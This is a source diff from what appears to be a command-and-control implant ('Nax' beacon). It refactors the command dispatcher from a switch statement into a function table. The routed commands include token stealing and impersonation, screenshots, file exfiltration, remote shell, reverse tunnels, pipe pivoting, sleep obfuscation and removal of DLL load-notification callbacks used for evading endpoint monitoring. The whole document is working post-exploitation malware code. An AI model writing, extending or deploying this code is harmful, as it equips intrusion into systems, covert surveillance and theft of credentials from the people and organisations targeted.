@@ -1,13 +1,191 @@
 /* beacon/src/Commands/Dispatch.c
- * NaxDispatch - execute one decoded task, write result into caller buffers.
+ * Table-driven command dispatch.
  *
  * To add a new command:
  *   1. Define NAX_CMD_YOURNAME in Wire.h
  *   2. Implement NaxCmdYourName() in Commands/YourName.c
- *   3. Add the case here and to the forward declarations below. */
+ *   3. Add a wrapper + table entry in NaxDispatchInit(). */
 
 #include "Nax.h"
 #include "Transport.h"
+
+/* ========= [ wrapper macros ] ========= */
+
+/* handler( Nax, args, args_len, out, out_len ) → NAX_OK / error */
+#define WRAP_STD(name) \
+    static INT Wrap_##name( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) { \
+        *st = ( name( Nax, task->Args, (UINT32)task->ArgsLen, out, out_len ) == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR; \
+        return 1; \
+    }
+
+/* handler( Nax, out, out_len ) → NAX_OK / error */
+#define WRAP_NOARG(name) \
+    static INT Wrap_##name( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) { \
+        (void)task; \
+        *st = ( name( Nax, out, out_len ) == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR; \
+        if ( *st != NAX_STATUS_OK ) *out_len = 0; \
+        return 1; \
+    }
+
+/* handler( Nax, task_id, args, args_len, out, out_len ) → NAX_OK / error */
+#define WRAP_TASKID(name) \
+    static INT Wrap_##name( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) { \
+        *st = ( name( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, out, out_len ) == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR; \
+        return 1; \
+    }
+
+/* ========= [ generated wrappers ] ========= */
+
+WRAP_NOARG(  NaxCmdWhoami )
+WRAP_STD(    NaxCmdSleep )
+WRAP_STD(    NaxCmdCd )
+WRAP_STD(    NaxCmdPwd )
+WRAP_STD(    NaxCmdMkdir )
+WRAP_STD(    NaxCmdRmdir )
+WRAP_STD(    NaxCmdCat )
+WRAP_STD(    NaxCmdLs )
+WRAP_STD(    NaxCmdCp )
+WRAP_STD(    NaxCmdMv )
+WRAP_STD(    NaxCmdRm )
+WRAP_NOARG(  NaxCmdScreenshot )
+WRAP_TASKID( NaxCmdDownload )
+WRAP_STD(    NaxCmdPsList )
+WRAP_STD(    NaxCmdPsKill )
+WRAP_STD(    NaxCmdPsRun )
+WRAP_STD(    NaxCmdUpload )
+WRAP_STD(    NaxCmdSaveMemory )
+WRAP_STD(    NaxCmdChunksize )
+WRAP_STD(    NaxCmdWatchdogSet )
+WRAP_STD(    NaxCmdBofStomp )
+WRAP_STD(    NaxCmdSleepmaskSet )
+WRAP_STD(    NaxCmdSleepObfConfig )
+WRAP_STD(    NaxCmdUnlink )
+WRAP_TASKID( NaxCmdLink )
+WRAP_NOARG(  NaxCmdJobList )
+WRAP_STD(    NaxCmdJobKill )
+WRAP_NOARG(  NaxCmdDllNotifyList )
+WRAP_NOARG(  NaxCmdDllNotifyRemove )
+WRAP_STD(    NaxCmdTokenSteal )
+WRAP_STD(    NaxCmdTokenUse )
+WRAP_NOARG(  NaxCmdTokenGetUid )
+WRAP_NOARG(  NaxCmdTokenList )
+WRAP_STD(    NaxCmdTokenRm )
+WRAP_NOARG(  NaxCmdTokenRevert )
+WRAP_STD(    NaxCmdTokenMake )
+WRAP_NOARG(  NaxCmdTokenPrivs )
+
+/* ========= [ special-case wrappers ] ========= */
+
+static INT Wrap_ExitThread( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    (void)task; (void)st; (void)out; (void)out_len;
+    Nax->Ntdll.RtlExitUserThread( 0 );
+    return 0;
+}
+
+static INT Wrap_ExitProcess( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    (void)task; (void)st; (void)out; (void)out_len;
+    Nax->Kernel32.ExitProcess( 0 );
+    return 0;
+}
+
+static INT Wrap_Bof( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    INT rc = NaxCmdBof( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, out, out_len );
+    if ( rc == NAX_STATUS_ASYNC ) {
+        *st       = NAX_STATUS_ASYNC;
+        *out_len  = 0;
+    } else {
+        *st = ( rc == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR;
+    }
+    return 1;
+}
+
+static INT Wrap_PivotExec( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    (void)st;
+    NaxCmdPivotExec( Nax, task->Args, (UINT32)task->ArgsLen, out, out_len );
+    return 0;
+}
+
+#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
+static INT Wrap_Profile( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    NaxCmdProfile( Nax, task->Args, (UINT32)task->ArgsLen, out, out_len );
+    *st       = out[0];
+    *out_len  = 0;
+    return 1;
+}
+#endif
+
+static INT Wrap_ShellDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    (void)st; (void)out; (void)out_len;
+    NaxShellDispatch( Nax, task->TaskId, task->CmdId, task->Args, (UINT32)task->ArgsLen );
+    return 0;
+}
+
+static INT Wrap_TunnelDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
+    (void)st; (void)out; (void)out_len;
+    NaxTunnelDispatch( Nax, task->CmdId, task->Args, (UINT32)task->ArgsLen );
+    return 0;
+}
+
+/* ========= [ table init ] ========= */
+
+FUNC VOID NaxDispatchInit( PNAX_INSTANCE Nax ) {
+    for ( UINT32 i = 0; i < NAX_CMD_TABLE_SIZE; i++ )
+        Nax->CmdTable[i] = NULL;
+
+    Nax->CmdTable[ NAX_CMD_WHOAMI ]        = Wrap_NaxCmdWhoami;
+    Nax->CmdTable[ NAX_CMD_SLEEP ]         = Wrap_NaxCmdSleep;
+    Nax->CmdTable[ NAX_CMD_EXIT_THREAD ]   = Wrap_ExitThread;
+    Nax->CmdTable[ NAX_CMD_EXIT_PROCESS ]  = Wrap_ExitProcess;
+    Nax->CmdTable[ NAX_CMD_CD ]            = Wrap_NaxCmdCd;
+    Nax->CmdTable[ NAX_CMD_PWD ]           = Wrap_NaxCmdPwd;
+    Nax->CmdTable[ NAX_CMD_MKDIR ]         = Wrap_NaxCmdMkdir;
+    Nax->CmdTable[ NAX_CMD_RMDIR ]         = Wrap_NaxCmdRmdir;
+    Nax->CmdTable[ NAX_CMD_CAT ]           = Wrap_NaxCmdCat;
+    Nax->CmdTable[ NAX_CMD_LS ]            = Wrap_NaxCmdLs;
+    Nax->CmdTable[ NAX_CMD_CP ]            = Wrap_NaxCmdCp;
+    Nax->CmdTable[ NAX_CMD_MV ]            = Wrap_NaxCmdMv;
+    Nax->CmdTable[ NAX_CMD_BOF ]           = Wrap_Bof;
+    Nax->CmdTable[ NAX_CMD_SCREENSHOT ]    = Wrap_NaxCmdScreenshot;
+    Nax->CmdTable[ NAX_CMD_DOWNLOAD ]      = Wrap_NaxCmdDownload;
+    Nax->CmdTable[ NAX_CMD_PS_LIST ]       = Wrap_NaxCmdPsList;
+    Nax->CmdTable[ NAX_CMD_PS_KILL ]       = Wrap_NaxCmdPsKill;
+    Nax->CmdTable[ NAX_CMD_PS_RUN ]        = Wrap_NaxCmdPsRun;
+    Nax->CmdTable[ NAX_CMD_UPLOAD ]        = Wrap_NaxCmdUpload;
+    Nax->CmdTable[ NAX_CMD_RM ]            = Wrap_NaxCmdRm;
+    Nax->CmdTable[ NAX_CMD_JOB_LIST ]      = Wrap_NaxCmdJobList;
+    Nax->CmdTable[ NAX_CMD_JOB_KILL ]      = Wrap_NaxCmdJobKill;
+    Nax->CmdTable[ NAX_CMD_SAVEMEMORY ]    = Wrap_NaxCmdSaveMemory;
+    Nax->CmdTable[ NAX_CMD_CHUNKSIZE ]     = Wrap_NaxCmdChunksize;
+    Nax->CmdTable[ NAX_CMD_WATCHDOG_SET ]  = Wrap_NaxCmdWatchdogSet;
+#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
+    Nax->CmdTable[ NAX_CMD_PROFILE ]       = Wrap_Profile;
+#endif
+    Nax->CmdTable[ NAX_CMD_BOF_STOMP ]     = Wrap_NaxCmdBofStomp;
+    Nax->CmdTable[ NAX_CMD_SLEEPMASK_SET ] = Wrap_NaxCmdSleepmaskSet;
+    Nax->CmdTable[ NAX_CMD_SLEEPOBF_CONFIG ] = Wrap_NaxCmdSleepObfConfig;
+    Nax->CmdTable[ NAX_CMD_PIVOT_EXEC ]    = Wrap_PivotExec;
+    Nax->CmdTable[ NAX_CMD_LINK ]          = Wrap_NaxCmdLink;
+    Nax->CmdTable[ NAX_CMD_UNLINK ]        = Wrap_NaxCmdUnlink;
+    Nax->CmdTable[ NAX_CMD_DLL_NOTIFY_LIST ]   = Wrap_NaxCmdDllNotifyList;
+    Nax->CmdTable[ NAX_CMD_DLL_NOTIFY_REMOVE ] = Wrap_NaxCmdDllNotifyRemove;
+    Nax->CmdTable[ NAX_CMD_TUNNEL_CONNECT_TCP ] = Wrap_TunnelDispatch;
+    Nax->CmdTable[ NAX_CMD_TUNNEL_WRITE_TCP ]   = Wrap_TunnelDispatch;
+    Nax->CmdTable[ NAX_CMD_TUNNEL_CLOSE ]       = Wrap_TunnelDispatch;
+    Nax->CmdTable[ NAX_CMD_TUNNEL_REVERSE ]     = Wrap_TunnelDispatch;
+    Nax->CmdTable[ NAX_CMD_TUNNEL_PAUSE ]       = Wrap_TunnelDispatch;
+    Nax->CmdTable[ NAX_CMD_TUNNEL_RESUME ]      = Wrap_TunnelDispatch;
+    Nax->CmdTable[ NAX_CMD_SHELL_START ]  = Wrap_ShellDispatch;
+    Nax->CmdTable[ NAX_CMD_SHELL_WRITE ]  = Wrap_ShellDispatch;
+    Nax->CmdTable[ NAX_CMD_SHELL_CLOSE ]  = Wrap_ShellDispatch;
+    Nax->CmdTable[ NAX_CMD_TOKEN_GETUID ]  = Wrap_NaxCmdTokenGetUid;
+    Nax->CmdTable[ NAX_CMD_TOKEN_STEAL ]   = Wrap_NaxCmdTokenSteal;
+    Nax->CmdTable[ NAX_CMD_TOKEN_USE ]     = Wrap_NaxCmdTokenUse;
+    Nax->CmdTable[ NAX_CMD_TOKEN_LIST ]    = Wrap_NaxCmdTokenList;
+    Nax->CmdTable[ NAX_CMD_TOKEN_RM ]      = Wrap_NaxCmdTokenRm;
+    Nax->CmdTable[ NAX_CMD_TOKEN_REVERT ]  = Wrap_NaxCmdTokenRevert;
+    Nax->CmdTable[ NAX_CMD_TOKEN_MAKE ]    = Wrap_NaxCmdTokenMake;
+    Nax->CmdTable[ NAX_CMD_TOKEN_PRIVS ]   = Wrap_NaxCmdTokenPrivs;
+}
 
 /* ========= [ dispatcher ] ========= */
 
@@ -18,306 +196,13 @@ FUNC INT NaxDispatch( PNAX_INSTANCE    Nax,
                       PBYTE            result_data,
                       UINT32*          result_data_len ) {
 
-    *result_task_id  = task->TaskId;
-    /* *result_data_len is the caller's buffer capacity - leave it as-is. */
+    *result_task_id = task->TaskId;
 
-    switch ( task->CmdId ) {
-
-    /* ---- CMD_WHOAMI (0x10) ---- */
-    case NAX_CMD_WHOAMI:
-        *result_status = ( NaxCmdWhoami( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        if ( *result_status != NAX_STATUS_OK ) *result_data_len = 0;
-        return 1;
-
-    /* ---- CMD_SLEEP (0x11) ---- */
-    case NAX_CMD_SLEEP:
-        *result_status = ( NaxCmdSleep( Nax, task->Args, (UINT32)task->ArgsLen,
-                                         result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        if ( *result_status != NAX_STATUS_OK ) *result_data_len = 0;
-        return 1;
-
-    /* ---- CMD_EXIT_THREAD (0x12) ---- */
-    case NAX_CMD_EXIT_THREAD:
-        Nax->Ntdll.RtlExitUserThread( 0 );
-        return 0;
-
-    /* ---- CMD_EXIT_PROCESS (0x13) ---- */
-    case NAX_CMD_EXIT_PROCESS:
-        Nax->Kernel32.ExitProcess( 0 );
-        return 0;
-
-    /* ---- CMD_CD (0x14) ---- */
-    case NAX_CMD_CD:
-        *result_status = ( CmdCd( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_PWD (0x15) ---- */
-    case NAX_CMD_PWD:
-        *result_status = ( CmdPwd( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_MKDIR (0x16) ---- */
-    case NAX_CMD_MKDIR:
-        *result_status = ( CmdMkdir( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_RMDIR (0x17) ---- */
-    case NAX_CMD_RMDIR:
-        *result_status = ( CmdRmdir( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_CAT (0x18) ---- */
-    case NAX_CMD_CAT:
-        *result_status = ( CmdCat( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_LS (0x19) ---- */
-    case NAX_CMD_LS:
-        *result_status = ( CmdLs( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_CP (0x1A) ---- */
-    case NAX_CMD_CP:
-        *result_status = ( CmdCp( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_MV (0x1B) ---- */
-    case NAX_CMD_MV:
-        *result_status = ( CmdMv( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_BOF (0x20) ---- */
-    case NAX_CMD_BOF: {
-        INT bof_rc = NaxCmdBof( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
-        if ( bof_rc == NAX_STATUS_ASYNC ) {
-            *result_status = NAX_STATUS_ASYNC;
-            *result_data_len = 0;
-        } else {
-            *result_status = ( bof_rc == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        }
-        return 1;
-    }
-
-    /* ---- CMD_SCREENSHOT (0x21) - GDI desktop capture ---- */
-    case NAX_CMD_SCREENSHOT:
-        *result_status = ( NaxCmdScreenshot( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        if ( *result_status != NAX_STATUS_OK ) *result_data_len = 0;
-        return 1;
-
-    /* ---- CMD_DOWNLOAD (0x22) - initiate chunked file download ---- */
-    case NAX_CMD_DOWNLOAD:
-        *result_status = ( NaxCmdDownload( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_PS_LIST (0x23) ---- */
-    case NAX_CMD_PS_LIST:
-        *result_status = ( CmdPsList( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_PS_KILL (0x24) ---- */
-    case NAX_CMD_PS_KILL:
-        *result_status = ( CmdPsKill( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_PS_RUN (0x25) ---- */
-    case NAX_CMD_PS_RUN:
-        *result_status = ( CmdPsRun( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_RM (0x27) - delete a file ---- */
-    case NAX_CMD_RM:
-        *result_status = ( CmdRm( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_CHUNKSIZE (0x2B) - set download chunk size ---- */
-    case NAX_CMD_CHUNKSIZE:
-        if ( task->ArgsLen >= 4 ) {
-            UINT32 newSz = NaxR32( task->Args );
-            if ( newSz > NAX_DL_CHUNK_MAX ) newSz = NAX_DL_CHUNK_MAX;
-            if ( newSz < 4096 )             newSz = 4096;
-            Nax->Config.DlChunkSize = newSz;
-            NaxW32( result_data, newSz );
-            *result_data_len = 4;
-            *result_status   = NAX_STATUS_OK;
-        } else {
-            *result_status   = NAX_STATUS_ERR;
-            *result_data_len = 0;
-        }
-        return 1;
-
-    /* ---- CMD_UPLOAD (0x26) - write accumulated MemSave data to disk ---- */
-    case NAX_CMD_UPLOAD:
-        *result_status = ( NaxCmdUpload( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_SAVEMEMORY (0x2A) - accumulate upload chunk ---- */
-    case NAX_CMD_SAVEMEMORY:
-        *result_status = ( NaxCmdSaveMemory( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_WATCHDOG_SET (0x2C) ---- */
-    case NAX_CMD_WATCHDOG_SET:
-        *result_status = ( NaxCmdWatchdogSet( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_PIVOT_EXEC (0x37) - write data to linked child ---- */
-    case NAX_CMD_PIVOT_EXEC:
-        CmdPivotExec( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
-        return 0;  /* no result frame - server already knows */
-
-    /* ---- CMD_LINK (0x38) - connect to child's named pipe ---- */
-    case NAX_CMD_LINK:
-        *result_status = ( CmdLink( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_UNLINK (0x39) - disconnect a linked child ---- */
-    case NAX_CMD_UNLINK:
-        *result_status = ( CmdUnlink( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
-    /* ---- CMD_PROFILE (0x30) - runtime profile update ---- */
-    case NAX_CMD_PROFILE:
-        CmdProfile( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
-        *result_status = result_data[0];
-        *result_data_len = 0;
-        return 1;
-#endif
-
-    /* ---- CMD_BOF_STOMP (0x31) - runtime BOF stomp reconfiguration ---- */
-    case NAX_CMD_BOF_STOMP:
-        *result_status = ( NaxCmdBofStomp( Nax, task->Args, (UINT32)task->ArgsLen,
-                                            result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_DLL_NOTIFY_LIST (0x3A) - enumerate DLL load notification callbacks ---- */
-    case NAX_CMD_DLL_NOTIFY_LIST:
-        *result_status = ( NaxCmdDllNotifyList( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_DLL_NOTIFY_REMOVE (0x3B) - remove all DLL load notification callbacks ---- */
-    case NAX_CMD_DLL_NOTIFY_REMOVE:
-        *result_status = ( NaxCmdDllNotifyRemove( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_SLEEPMASK_SET (0x32) - load sleepmask BOF persistently ---- */
-    case NAX_CMD_SLEEPMASK_SET:
-        *result_status = ( NaxCmdSleepmaskSet( Nax, task->Args, (UINT32)task->ArgsLen,
-                                                result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_SLEEPOBF_CONFIG (0x33) - runtime sleep obfuscation toggle ---- */
-    case NAX_CMD_SLEEPOBF_CONFIG:
-        *result_status = ( NaxCmdSleepObfConfig( Nax, task->Args, (UINT32)task->ArgsLen,
-                                                  result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_JOB_LIST (0x28) ---- */
-    case NAX_CMD_JOB_LIST:
-        *result_status = ( NaxJobList( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- CMD_JOB_KILL (0x29) ---- */
-    case NAX_CMD_JOB_KILL:
-        if ( task->ArgsLen >= 4 ) {
-            UINT32 killTaskId = NaxR32( task->Args );
-            *result_status = ( NaxJobKill( Nax, killTaskId ) == NAX_OK )
-                                 ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        } else {
-            *result_status = NAX_STATUS_ERR;
-        }
-        *result_data_len = 0;
-        return 1;
-
-    /* ---- shell commands (0x47–0x49) ---- */
-    case NAX_CMD_SHELL_START:
-    case NAX_CMD_SHELL_WRITE:
-    case NAX_CMD_SHELL_CLOSE:
-        NaxShellDispatch( Nax, task->TaskId, task->CmdId, task->Args, (UINT32)task->ArgsLen );
-        return 0;
-
-    /* ---- tunnel commands (0x3E–0x46) ---- */
-    case NAX_CMD_TUNNEL_CONNECT_TCP:
-    case NAX_CMD_TUNNEL_WRITE_TCP:
-    case NAX_CMD_TUNNEL_CLOSE:
-    case NAX_CMD_TUNNEL_REVERSE:
-    case NAX_CMD_TUNNEL_PAUSE:
-    case NAX_CMD_TUNNEL_RESUME:
-        NaxTunnelDispatch( Nax, task->CmdId, task->Args, (UINT32)task->ArgsLen );
-        return 0;
-
-    /* ---- token commands (0x50–0x57) ---- */
-    case NAX_CMD_TOKEN_GETUID:
-        *result_status = ( CmdTokenGetUid( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_STEAL:
-        *result_status = ( CmdTokenSteal( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_USE:
-        *result_status = ( CmdTokenUse( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_LIST:
-        *result_status = ( CmdTokenList( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_RM:
-        *result_status = ( CmdTokenRm( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_REVERT:
-        *result_status = ( CmdTokenRevert( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_MAKE:
-        *result_status = ( CmdTokenMake( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    case NAX_CMD_TOKEN_PRIVS:
-        *result_status = ( CmdTokenPrivs( Nax, result_data, result_data_len ) == NAX_OK )
-                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
-        return 1;
-
-    /* ---- unrecognised command ---- */
-    default:
+    if ( task->CmdId >= NAX_CMD_TABLE_SIZE || !Nax->CmdTable[ task->CmdId ] ) {
         *result_status   = NAX_STATUS_ERR;
         *result_data_len = 0;
         return 1;
     }
+
+    return Nax->CmdTable[ task->CmdId ]( Nax, task, result_status, result_data, result_data_len );
 }
